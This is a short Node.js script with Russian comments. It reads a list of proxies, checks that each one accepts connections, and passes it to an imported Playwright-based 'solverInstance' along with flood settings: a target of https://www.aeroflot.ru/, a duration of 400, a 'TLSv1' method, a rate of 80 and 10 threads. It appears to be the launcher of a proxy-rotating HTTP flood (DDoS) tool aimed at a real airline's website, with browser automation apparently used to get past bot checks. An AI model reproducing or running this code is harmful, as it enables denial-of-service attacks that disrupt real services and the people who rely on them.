const { solverInstance } = require('./playwright.js');
const fs = require('fs');
const readline = require('readline');

const baseArgs = {
  Target: "https://www.aeroflot.ru/",
  Time: "400",
  Method: "TLSv1",
  Rate: "80",
  Threads: "10"
};


(async () => {
  const fileStream = fs.createReadStream('./proxies.txt');

  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
  });


  for await (const line of rl) {
    const proxy = line.trim();
    if (!proxy || proxy.startsWith('#')) continue;

    const [ip, port] = proxy.split(':');
    const isAlive = await checkProxy(ip, port);
    if (!isAlive) continue;

    try {
      
      const fullArgs = { ...baseArgs, Proxy: proxy };
      await solverInstance(fullArgs);
      
      //await solverInstance(proxy); // вот здесь передаётся прокси как строка
    } catch (e) {
      console.error(`[ERROR] ${proxy}: ${e.message}`);
    }
  }
})();

// простая проверка доступности прокси
async function checkProxy(ip, port) {
  return new Promise((resolve) => {
    const net = require('net');
    const socket = new net.Socket();
    socket.setTimeout(2000);
    socket.on('connect', () => {
      socket.destroy();
      resolve(true);
    });
    socket.on('error', () => resolve(false));
    socket.on('timeout', () => resolve(false));
    socket.connect(port, ip);
  });
}